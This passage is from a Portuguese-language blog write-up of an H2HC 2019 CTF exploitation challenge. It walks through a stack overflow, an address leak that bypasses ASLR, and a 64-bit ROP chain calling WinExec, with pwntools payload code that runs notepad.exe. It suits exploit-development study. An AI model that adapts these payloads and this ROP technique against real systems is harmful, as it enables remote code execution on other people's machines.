href="/assets/2019/11/Screen-Shot-2019-11-06-at-08.04.55.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 2850 198'%3E%3C/svg%3E" data-src="/assets/2019/11/Screen-Shot-2019-11-06-at-08.04.55.png" alt="" width="2850" height="198" class="lazyload" data-proofer-ignore></a></p><p><a href="/assets/2019/11/Screen-Shot-2019-11-06-at-08.05.09.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1450 840'%3E%3C/svg%3E" data-src="/assets/2019/11/Screen-Shot-2019-11-06-at-08.05.09.png" alt="" width="1450" height="840" class="lazyload" data-proofer-ignore></a></p><h3>0x0302 - Análise dinâmica até este ponto.</h3><p>Analisando um pouco mais a fundo podemos ver que na função FUN_140001050 temos a opção de manipular o endereço de retorno.</p><p>Em um fluxo normal, onde passamos um tamanho de no máximo 0xff, temos o comportamento normal da aplicação</p><p><a href="/assets/2019/11/Screen-Shot-2019-11-06-at-08.58.39.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 2852 188'%3E%3C/svg%3E" data-src="/assets/2019/11/Screen-Shot-2019-11-06-at-08.58.39.png" alt="" width="2852" height="188" class="lazyload" data-proofer-ignore></a></p><p>Primeiramente é atribuído a EAX o valor que está no endereço de memória final e5b4 que corresponde ao hexa 0x04</p><p><a href="/assets/2019/11/Screen-Shot-2019-11-06-at-08.54.16-1.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 2880 1082'%3E%3C/svg%3E" data-src="/assets/2019/11/Screen-Shot-2019-11-06-at-08.54.16-1.png" alt="" width="2880" height="1082" class="lazyload" data-proofer-ignore></a></p><p>Posteriormente atribui a RCX o valor da posição de memória final e5b8 cujo o seu valor é 0x00</p><p><a href="/assets/2019/11/Screen-Shot-2019-11-06-at-08.55.04-1.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 2880 1080'%3E%3C/svg%3E" data-src="/assets/2019/11/Screen-Shot-2019-11-06-at-08.55.04-1.png" alt="" width="2880" height="1080" class="lazyload" data-proofer-ignore></a></p><p>E se utiliza desses 2 valores para cacular o endereço que posteriormente será usado como endereço de retorno da função FUN_140001380 que chamou essa função (FUN_140001050).</p><p><a href="/assets/2019/11/Screen-Shot-2019-11-06-at-08.55.39-1.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 2880 1082'%3E%3C/svg%3E" data-src="/assets/2019/11/Screen-Shot-2019-11-06-at-08.55.39-1.png" alt="" width="2880" height="1082" class="lazyload" data-proofer-ignore></a></p><p>E como podemos ver no topo da pilha no momento do ret da função FUN_140001380 está o endereço que foi calculado anteriormente, desta forma a aplicação chamará como proxima instrução este endereço.</p><p><a href="/assets/2019/11/Screen-Shot-2019-11-06-at-08.56.03.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 2880 1094'%3E%3C/svg%3E" data-src="/assets/2019/11/Screen-Shot-2019-11-06-at-08.56.03.png" alt="" width="2880" height="1094" class="lazyload" data-proofer-ignore></a></p><p>Quando passamos o valor 0x100 como tamanho podemos ver que o os valores em ...e5b4 e ...e5b8 são adulterados e consequentemente o endereço de retorno é alterado.</p><p><a href="/assets/2019/11/Screen-Shot-2019-11-06-at-09.14.07.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 2850 190'%3E%3C/svg%3E" data-src="/assets/2019/11/Screen-Shot-2019-11-06-at-09.14.07.png" alt="" width="2850" height="190" class="lazyload" data-proofer-ignore></a></p><p><a href="/assets/2019/11/Screen-Shot-2019-11-06-at-09.16.05.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 2880 1092'%3E%3C/svg%3E" data-src="/assets/2019/11/Screen-Shot-2019-11-06-at-09.16.05.png" alt="" width="2880" height="1092" class="lazyload" data-proofer-ignore></a></p><p><a href="/assets/2019/11/Screen-Shot-2019-11-06-at-09.17.04.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 2880 1074'%3E%3C/svg%3E" data-src="/assets/2019/11/Screen-Shot-2019-11-06-at-09.17.04.png" alt="" width="2880" height="1074" class="lazyload" data-proofer-ignore></a></p><p><a href="/assets/2019/11/Screen-Shot-2019-11-06-at-09.17.47.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 2880 1064'%3E%3C/svg%3E" data-src="/assets/2019/11/Screen-Shot-2019-11-06-at-09.17.47.png" alt="" width="2880" height="1064" class="lazyload" data-proofer-ignore></a></p><p>O problema é que como esse (0x100) é o valor que podemos passar, não temos como fazer de forma direta uma substituição desses valores para que possamos efetivamente manipular o ret de forma que possamos passar valores de endereço válido.</p><p>Após uma análise mais profunda e diversos testes encontrei que a vulnerabilidade pela qual é possível realizar o controle ro RET, é aliada com a que mostramos anteriormente, mas ela ocorre somente após o segundo envio de dados.</p><p>Em uma tentativa de ilustrar melhor o que ocorre (antes de vermos o código da aplicação), a aplicação recebe os dados na pilha atual (no tamanho especificado pelo usuário até 0x100), mas para realizar isso realiza a soma 2 valores para definir esse tamanho que será recebido, a falha ocorre exatamente neste ponto. Um dos valores da soma é o que o usuário passou 0x00 até 0x0100) e o outro é ums posição de memória, o problema que essa posição de memória está 252 bytes (Hexa: 0xFC) a frente da posição de memória onde é salvo os dados recebidos do socket, como nós podemos gravar até 256 bytes (Hexa: 0x0100), podemos substituir esse valor do cálculo.</p><p>Segue abaixo os prints das evidencias do teste</p><p>Comandos sequenciais para evidenciar a falha</p><p><a href="/assets/2019/11/Screen-Shot-2019-11-06-at-11.42.25.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 2128 132'%3E%3C/svg%3E" data-src="/assets/2019/11/Screen-Shot-2019-11-06-at-11.42.25.png" alt="" width="2128" height="132" class="lazyload" data-proofer-ignore></a></p><p>Note o endereço para o qual serão enviados os dados (<strong>0xc7f5e0</strong>) bem como os dados que estão na pilha.</p><p><a href="/assets/2019/11/Screen-Shot-2019-11-06-at-11.26.23-1.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 2880 1342'%3E%3C/svg%3E" data-src="/assets/2019/11/Screen-Shot-2019-11-06-at-11.26.23-1.png" alt="" width="2880" height="1342" class="lazyload" data-proofer-ignore></a></p><p>Agora logo após a execução da função de recebimento dos dados.</p><p><a href="/assets/2019/11/Screen-Shot-2019-11-06-at-11.29.38.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 2880 1334'%3E%3C/svg%3E" data-src="/assets/2019/11/Screen-Shot-2019-11-06-at-11.29.38.png" alt="" width="2880" height="1334" class="lazyload" data-proofer-ignore></a></p><p>Agora executamos o segundo comando</p><p><a href="/assets/2019/11/Screen-Shot-2019-11-06-at-11.53.14.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 2850 352'%3E%3C/svg%3E" data-src="/assets/2019/11/Screen-Shot-2019-11-06-at-11.53.14.png" alt="" width="2850" height="352" class="lazyload" data-proofer-ignore></a></p><p>Observe agora os valores de RAX e RCX, onde RAX recebe o valor que está na posição 252 do nosso buffer, e o RCX recebe o valor 05, que foi o tamanho passado por mim, e a soma dos 2 vai ocorrer podendo assim extrapolar os 256 bytes de limite da aplicação.</p><p><a href="/assets/2019/11/Screen-Shot-2019-11-06-at-11.44.10.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 2878 848'%3E%3C/svg%3E" data-src="/assets/2019/11/Screen-Shot-2019-11-06-at-11.44.10.png" alt="" width="2878" height="848" class="lazyload" data-proofer-ignore></a></p><p>&nbsp;</p><h3>0x0303 - Memory Address Leak.</h3><p>Para que possamos redirecionar o fluxo da aplicação para um endereço de POP POP RET ou outro qualquer que desejamos, se faz necessário conhecer o endereçamento atual da execução e como a aplicação e o Sistema Operacional estão com as proteções de memória Habilitadas (neste caso ASLR).</p><p>Para que a aplicação nos envie os dados, ela faz um cálculo um pouco diferente, usando outras posições de memória, mas igualmente podendo serem manipuladas por nós.</p><p>Segue abaixo as 2 linhas responsáveis por explorar a vulnerabilidade do leak.</p><p><a href="/assets/2019/11/Screen-Shot-2019-11-06-at-12.16.53.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 2854 394'%3E%3C/svg%3E" data-src="/assets/2019/11/Screen-Shot-2019-11-06-at-12.16.53.png" alt="" width="2854" height="394" class="lazyload" data-proofer-ignore></a></p><p>Observe que os registradores RAX e RCX receberam os dados desejados.</p><p><a href="/assets/2019/11/Screen-Shot-2019-11-06-at-12.17.11.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 2880 846'%3E%3C/svg%3E" data-src="/assets/2019/11/Screen-Shot-2019-11-06-at-12.17.11.png" alt="" width="2880" height="846" class="lazyload" data-proofer-ignore></a></p><p>Que posteriormente serão utilizados como terceiro parâmetro da função Send do Socket que por sua vez é o parâmetro que define o tamanho do buffer que será enviado</p><p><a href="/assets/2019/11/Screen-Shot-2019-11-06-at-12.19.10.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 2880 1444'%3E%3C/svg%3E" data-src="/assets/2019/11/Screen-Shot-2019-11-06-at-12.19.10.png" alt="" width="2880" height="1444" class="lazyload" data-proofer-ignore></a></p><p>Neste ponto vamos escrever nosso primeiro PoC do exploit. Neste exploit ainda não temos uma versão funcional do Leak, pois precisaremos realizar alguns ajustes para que o mesmo funcione corretamente (próximo assunto que abordaremos). Adicionalmente iremos utilizar a biblioteca <a href="http://docs.pwntools.com">pwnlib</a> para nos facilitar no processo de exploit.</p><p><script src="https://gist-it.appspot.com/github/helviojunior/ctf/blob/master/2019_H2HC/exploit/01_poc.py"></script></p><h3>0x0303 - Retomada do fluxo.</h3><p>Para que a nossa aplicação nos retorno os dados se faz necessário ajustar nosso payload para que o endereço no topo da pilha (conforme vimos em <strong>0x0302 - Análise dinâmica até este ponto</strong>).</p><p>Abaixo temos o novo script, nele podemos observar que removi os últimos bytes do segundo payload para que tenhamos um endereço de retorno viável, pois com eles estavam sendo substituídos os endereços que a aplicação usa para controle.</p><p><script src="https://gist-it.appspot.com/github/helviojunior/ctf/blob/master/2019_H2HC/exploit/02_ret_addr.py"></script></p><p>Ajustamos os ultimos 4 bytes para ser 0x040090000 de forma que o byte 0x04 é usado (dentro da função FUN_140001050) para ser o RAX que será posteriormente multiplicado a 8 e somado a um endereço para calcular o endereço que ficará como sendo o endereço no topo da pilha para ser usado no RET, sendo assim o endereço das próximas instruções da nossa aplicação.</p><p><a href="/assets/2019/11/Screen-Shot-2019-11-06-at-15.23.09.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 2880 878'%3E%3C/svg%3E" data-src="/assets/2019/11/Screen-Shot-2019-11-06-at-15.23.09.png" alt="" width="2880" height="878" class="lazyload" data-proofer-ignore></a></p><p>Segue abaixo a imagem do endereço calculado no topo da pilha.</p><p><a href="/assets/2019/11/Screen-Shot-2019-11-06-at-15.25.51.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 2880 982'%3E%3C/svg%3E" data-src="/assets/2019/11/Screen-Shot-2019-11-06-at-15.25.51.png" alt="" width="2880" height="982" class="lazyload" data-proofer-ignore></a></p><p>Mas temos que lembrar que este conjunto de 4 bytes são os usados como tamanho de retorno dos dados por parte da função send do socket (como cimos anteriormente). Sendo assim para que tenhamos o leak de diversos endereços que precisamos colocar no mínimo 2308 bytes (Hexa: 0x0904).</p><p>Como resultado da execução podemos ver que tivemos um retorno de 0xa03 bytes, sendo que diversos deles são leaks de endereços da aplicação.</p><p><a href="/assets/2019/11/Screen-Shot-2019-11-06-at-16.14.47.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1616 1158'%3E%3C/svg%3E" data-src="/assets/2019/11/Screen-Shot-2019-11-06-at-16.14.47.png" alt="" width="1616" height="1158" class="lazyload" data-proofer-ignore></a></p><p>Utilizando o trecho de código abaixo podemos capturar e tratar os dados recebidos a fim de extrair os endereços desejados.</p><p>[sourcecode language="python"]p1.recvuntil(&quot;H2HC19 message:&quot;)</p><p>#Leak de um endereço no próprio fluxo de execução da aplicação (Sessão .text)<br /> p1.recv(0x10d)<br /> ld1 = p1.recv(8)<br /> leak_local_addr = u64(ld1.ljust(8, &quot;\x00&quot;))</p><p>base_addr = leak_local_addr &amp;amp;amp; 0xffffffffffff0000</p><p>log.info(&quot;Local leak : %s&quot; % hex(leak_local_addr))<br /> log.info(&quot;App Base Addr : %s&quot; % hex(base_addr))</p><p># Leak do endereço da função WinExec<br /> p1.recv(0x7f0) #offset entre a posição zero até o 90 f0 7e 0a fa 7f<br /> lead_data = p1.recv(8)<br /> p1.recv(4096)</p><p>leak = u64(lead_data.ljust(8, &quot;\x00&quot;))</p><p>log.info(&quot;WinExec addr leak : %s&quot; % hex(leak))<br /> [/sourcecode]</p><p>Tendo como resultado abaixo</p><p><a href="/assets/2019/11/Screen-Shot-2019-11-06-at-16.22.27.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1608 1270'%3E%3C/svg%3E" data-src="/assets/2019/11/Screen-Shot-2019-11-06-at-16.22.27.png" alt="" width="1608" height="1270" class="lazyload" data-proofer-ignore></a></p><p>Segue o código completo<br /> <script src="https://gist-it.appspot.com/github/helviojunior/ctf/blob/master/2019_H2HC/exploit/03_leak.py"></script></p><h2>0x04 - ROP - Controlando o fluxo da aplicação</h2><p>Uma vez que temos o endereço base da aplicação podemos utilizar nossos Gadgets para controlar o fluxo da aplicação</p><p>Sendo assim temos como payload do terceiro estágio o trecho abaixo</p><p>[sourcecode language="python"]payload3 = &quot;H2HC&quot; #cookie<br /> payload3 += &quot;\x00\x01\x00\x00&quot; #size to trigger the vul<br /> payload3 += &quot;A&quot; * 0x100<br /> payload3 += &quot;\x01\x01\x01\x01&quot; # Não pode ter nullbyte aqui<br /> payload3 += &quot;A&quot; * (8) # padding</p><p>payload3 += p64(base_addr + 0x0464f) # NOP RET para saltar para depois do alinhamento</p><p>payload3 += &quot;\x41&quot; * (4) # Alinhamento<br /> payload3 += &quot;\x42&quot; * (8) # Trash<br /> [/sourcecode]</p><p>Ficando nosso exploit completo como abaixo<br /> <script src="https://gist-it.appspot.com/github/helviojunior/ctf/blob/master/2019_H2HC/exploit/04_ppr1.py"></script></p><h2>0x05 - WinExec x64 calling conventions</h2><p>Essa fase creio que foi uma das mais desafiadoras, pois tive que voltar aos livros (neste caso a web) e ler de forma detalhada a Convenção de chamada (Calling Conventions) disponível em <a href="https://docs.microsoft.com/pt-br/cpp/build/x64-calling-convention?view=vs-2019">https://docs.microsoft.com/pt-br/cpp/build/x64-calling-convention?view=vs-2019</a></p><p>Isso ocorre pois em 64bits há uma série de requisitos definidos na convenção de chamada que precisam ser cumpridos para que a aplicação (Chamada da função WinExec) funcione corretamente.</p><p>Segue abaixo os requisitos:</p><ol><li>O Comando tem de estar a frente da posição da pilha (ou 128 bytes antes) no momento do call da WinExec, pois dentro da chamada da winexec ele utiliza alguns bytes anteriores a posição atual da stack, causando a substituição do nosso comando<li>O Endereço do comando tem de estar alinhado a 16 bytes para saber se o endereço está alinhado basta realizar o calculo (endereço &amp; 0xfffffffffffffff0)<li>O Endereço da pilha no momento da chamada do call da WinExec tem de estar alinhado a 16 bytes<li>Na Pilha tem de ter o equivalente a 3 parâmetros como Shadow data (3 * 8 bytes)<li>Na quarta posição da pilha tem de haver um endereço válido da aplicação (não é efetivamente usado mas dentro da WinExec ele cacula alguma coisa com este endereço e se for inválido da exception)</ol><p>Conforme a definição da Microsoft a função WinExec (<a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec">https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec</a>) necessita de 2 parâmetros</p><p>[sourcecode language="c"]UINT WinExec(<br /> LPCSTR lpCmdLine,<br /> UINT uCmdShow<br /> );<br /> [/sourcecode]</p><p>Onde:</p><ol><li><strong>lpCmdLine</strong> é o comando a ser executado;<li><strong>uCmdShow</strong> como deve ser a visualização da aplicação filha. Este parâmetro acita diversos valores, mas os principais são: 0 - Hide, 3 - Maximize; 6 - Minimize; e 5 Show);</ol><p>Segundo a convenção de chamadas para 64bits devemos ter então as seguintes informações:</p><ul><li>RCX: Primeiro parâmetro da função (<strong>lpCmdLine</strong>);<li>RDX: Segundo parâmetro da função (<strong>uCmdShow</strong>);<li>Pilha: Shadow space;</ul><p>A nossa função (WinExec) exige os seguintes requisitos adicionais:</p><ul><li>Shadow space precisa ser de 24 bytes (3 * 8);<li>Após os 24 bytes um endereço válido da aplicação. (Não entendi bem o porque, mas meu chute é que a função tenha alguma mitigação que verifique se o endereço de retorno é um endereço válido)</ul><h2>0x06 - ROP exploit final</h2><p>Utilizando os gadgets que pegamos no início deste tutorial, podemos calcular os dados de forma estratégica para montar os dados conforme os requisitos acima, ficando conforme e imagem abaixo</p><p><a href="/assets/2019/11/Screen-Shot-2019-11-06-at-17.26.59.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 2880 1032'%3E%3C/svg%3E" data-src="/assets/2019/11/Screen-Shot-2019-11-06-at-17.26.59.png" alt="" width="2880" height="1032" class="lazyload" data-proofer-ignore></a></p><p>Onde:</p><ul><li>R12 contém o endereço da função WinExec;<li>RCX contém o parâmetro <strong>lpCmdLine</strong>, ou seja, endereço do comando a ser executado;<li>RDX contém o parâmetro <strong>uCmdShow</strong>, ou seja, zero;<li>Pilha (stack) contém 24 bytes de shadow space seguido de um endereço válido da aplicação;</ul><p>Ficando então este trecho de ROP conforme abaixo</p><p>[sourcecode language="python"]base_offset = 928 # esse offset calcula de forma que o apontamento chegue a primeira instrução do ROP Chain abaixo</p><p>rop_chain2 = p64(leak) # WinExec --&amp;gt; Endereço que será chamado pelo call r12<br /> rop_chain2 += p64(base_addr + 0x05c14) # add eax, r15d ; ret<br /> rop_chain2 += p64(base_addr + 0x0166a) # add esp, 0x28 ; ret --&amp;gt; Ajusta o alinhamento a 16 bytes<br /> rop_chain2 += &quot;\x41&quot; * 0x28<br /> rop_chain2 += p64(base_addr + 0x0464f) # nop ; ret<br /> rop_chain2 += p64(base_addr + 0x06e1d) # mov rcx, rax ; call r12<br /> rop_chain2 += &quot;\x00&quot; * (8*3) # Shadow Data<br /> rop_chain2 += p64(base_addr + 0x0464f) # NOP RET --&amp;gt; Será usado pela função WinExec<br /> rop_chain2 += &quot;\x00&quot; * (8*10) # Padding<br /> rop_chain2 += &quot;\x00&quot; * ((len(rop_chain2) + (8 * 4)) % 16) # Calcula simetria de 16 bytes</p><p>rop_chain1 = p64(base_addr + 0x07cc8) # mov rax, r11 ; ret<br /> rop_chain1 += p64(base_addr + 0x04b59) # pop r15 ; pop r13 ; pop r12 ; ret<br /> rop_chain1 += p64(base_offset + len(rop_chain2) + (8 * 4)) # Numero a ser adicionado em rax<br /> rop_chain1 += &quot;\x41&quot; * 8</p><p>cmd = &quot;notepad.exe&quot;</p><p>payload3 += rop_chain1 + rop_chain2 + cmd + &quot;\x00&quot;<br /> [/sourcecode]</p><p>E tendo nosso código final funcional abaixo</p><p><script src="https://gist-it.appspot.com/github/helviojunior/ctf/blob/master/2019_H2HC/exploit/05_winexec_funcional.py"></script></p><h2>0x06 - Agradecimentos</h2><p>Gostaria de agradecer aos amigos que jogaram comigo no CTF do H2HC, mesmo que não tenhamos conseguido resolver esse desafio de exploitation a tempo de pontuar no CTF, mas o desafio valeu a pena. Também gostaria de agradecer o Feroso pela troca de idéias e dicas durante o estudo deste exploit.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/it/'>IT</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=[CTF - Writeup] Exploit H2HC 2019 - Helvio Junior&url=https://www.helviojunior.com.br/it/ctf-exploit-h2hc-2019/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=[CTF - Writeup] Exploit H2HC 2019 - Helvio Junior&u=https://www.helviojunior.com.br/it/ctf-exploit-h2hc-2019/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=[CTF - Writeup] Exploit H2HC 2019 - Helvio Junior&url=https://www.helviojunior.com.br/it/ctf-exploit-h2hc-2019/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://www.helviojunior.com.br/it/ctf-exploit-h2hc-2019/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/security/osint/localizando-ips-que-respondem-para-uma-url/">Localizando IPs que respondem para uma URL</a><li><a href="/security/osint/locating-url-ips-bypass-waf/">Locating IPs that respond to a URL</a><li><a href="/security/edr/instalando-elasticsearch-edr/">Instalando Elasticsearch EDR</a><li><a href="/it/instalando-openvpn-com-autenticacao-em-mysql/">Instalando OpenVPN com autenticação em MySQL</a><li><a href="/it/osce-osed-e-ecxd-certificacoes-de-desenvolvimento-de-exploits/">OSCE, OSED e eCXD: Certificações de desenvolvimento de Exploits</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/offensive-security/">Offensive Security</a> <a class="post-tag" href="/tags/pentest/">Pentest</a> <a class="post-tag" href="/tags/autoridade-certificadora/">autoridade certificadora</a> <a class="post-tag" href="/tags/ca/">ca</a> <a class="post-tag" href="/tags/certificate-authority/">certificate authority</a> <a class="post-tag" href="/tags/openssl/">openssl</a> <a class="post-tag" href="/tags/osce3/">OSCE3</a> <a class="post-tag" href="/tags/buffer-overflow/">Buffer Overflow</a> <a class="post-tag" href="/tags/osed/">OSED</a> <a class="post-tag" href="/tags/osee/">OSEE</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/it/configurando-802-1q-vlan-tagging/"><div class="card-body"> <span class="timeago small" > Mar 13, 2013 <i class="unloaded">2013-03-13T21:14:35-03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Configurando 802.1q VLAN Tagging no linux</h3><div class="text-muted small"><p> 1 - Verifique se o módulo está carregado no kernel [sourcecode language="csharp"]lsmod | grep 8021q[/sourcecode] 2 - Se o módulo não tiver carregado, carregue com o seguinte comando: [sourcecode la...</p></div></div></a></div><div class="card"> <a href="/it/configurando-802-1q-vlan-tagging-no-ubuntu/"><div class="card-body"> <span class="timeago small" > Mar 18, 2013 <i class="unloaded">2013-03-18T13:20:40-03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Configurando 802.1q VLAN Tagging no ubuntu até 14.04</h3><div class="text-muted small"><p> 1 - Realize a instalação do módulo [sourcecode language="shell"]sudo apt-get install vlan[/sourcecode] 2 - Verifique se o módulo está carregado no kernel [sourcecode language="shell"]lsmod | grep 8...</p></div></div></a></div><div class="card"> <a href="/it/visualizando-o-imei-de-celular-android/"><div class="card-body"> <span class="timeago small" > May 15, 2013 <i class="unloaded">2013-05-15T15:12:03-03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Visualizando o IMEI de celular Android</h3><div class="text-muted small"><p> O IMEI é um número único que cada aparelho telefônico móvel sendo necessário em alguns casos para interações com sua operadora de telefonia ou registro de aplicativos. Para ver o IMEI de um smartp...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/it/security/criacao-de-exploits/criacao-de-exploits-parte-4-estudo-de-caso-vulnserver-kstet-com-reaproveitamento-da-funcao-ws2_32-recv/" class="btn btn-outline-primary" prompt="Older"><p>Criação de Exploits - Parte 4 - Estudo de caso: vulnserver KSTET com reaproveitamento da função WS2_32 Recv</p></a> <a href="/it/disassemble-raw-file/" class="btn btn-outline-primary" prompt="Newer"><p>Disassemble raw file</p></a></div><div id="disqus" class="pt-2 pb-2"><p class="text-center text-muted small pb-5"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script src="/assets/js/lib/jquery.disqusloader.min.js"></script> <script> const options = { scriptUrl: '//.disqus.com/embed.js', disqusConfig: function() { this.page.title = '[CTF - Writeup] Exploit H2HC 2019'; this.page.url = 'https://www.helviojunior.com.br/it/ctf-exploit-h2hc-2019/'; this.page.identifier = '/it/ctf-exploit-h2hc-2019/'; } }; $.disqusLoader('#disqus', options); </script></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2024 <a href="https://github.com/helviojunior">Helvio junior (aka M4v3r1ck)</a>. <span data-toggle="tooltip" data-placement="top" title="Some rights reserved.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/offensive-security/">Offensive Security</a> <a class="post-tag" href="/tags/pentest/">Pentest</a> <a class="post-tag" href="/tags/autoridade-certificadora/">autoridade certificadora</a> <a class="post-tag" href="/tags/ca/">ca</a> <a class="post-tag" href="/tags/certificate-authority/">certificate authority</a> <a class="post-tag" href="/tags/openssl/">openssl</a> <a class="post-tag" href="/tags/osce3/">OSCE3</a> <a class="post-tag" href="/tags/buffer-overflow/">Buffer Overflow</a> <a class="post-tag" href="/tags/osed/">OSED</a> <a class="post-tag" href="/tags/osee/">OSEE</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://www.helviojunior.com.br{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
